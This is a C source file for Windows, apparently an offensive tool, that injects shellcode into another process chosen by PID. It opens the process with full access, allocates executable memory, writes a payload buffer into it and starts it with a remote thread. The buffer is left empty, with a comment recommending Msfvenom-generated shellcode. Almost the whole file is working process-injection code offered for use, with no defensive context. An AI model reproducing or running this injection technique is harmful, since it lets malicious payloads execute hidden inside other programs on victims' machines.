#include <windows.h>
#include <stdio.h>
#include <unistd.h>

unsigned char buf[] = /*Shellcode (Recomended: Msfvenom)*/

unsigned int payload_len = sizeof(buf);

int steal_process(int process_ID){

    DWORD PID, new_pid = 0;
    HANDLE hProcess, hThread;
    void * rBuffer;

    PID = process_ID;

    printf("\n[+] Trying to Handle the Process => %ld...\n", PID);
    sleep(1);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if(hProcess == NULL){
        printf("[X] The process [%ld] could not be opened!\n", PID);
        printf("ERROR: %ld\n", GetLastError());

        return 1;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("(!) The Payload was allocated in the process with %zu Bytes and 'PAGE_EXECUTE_READWRITE' privileges!\n", sizeof(buf));
    sleep(1);

    WriteProcessMemory(hProcess, rBuffer, buf, payload_len, NULL);
    printf("(!) The payload with (%zu) Bytes has been written to the process memory\n\n", sizeof(buf));
    printf("[+] Creating New Thread!...\n");
    
    sleep(2);

    hThread = CreateRemoteThreadEx(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE) rBuffer, 
        NULL, 
        0,
        0,
        &new_pid
    );

    if(hThread == NULL){
        printf("[X] Failed to create remote Thread\n");
        printf("ERROR: %ld", GetLastError());
        
        CloseHandle(hProcess);

        return 1;
    }

    printf("(!) REMOTE Thread Created! The payload is running... [PID: %ld]\n", new_pid);
    CloseHandle(hThread); CloseHandle(hProcess);

    return 0;
}

int main(int argc, char* argv[]){

    if(argc < 2){

        printf("(!) ./app <Process PID>");
        return 1;
    }
    else{

        steal_process(atoi(argv[1]));
    }

    return 0;
}

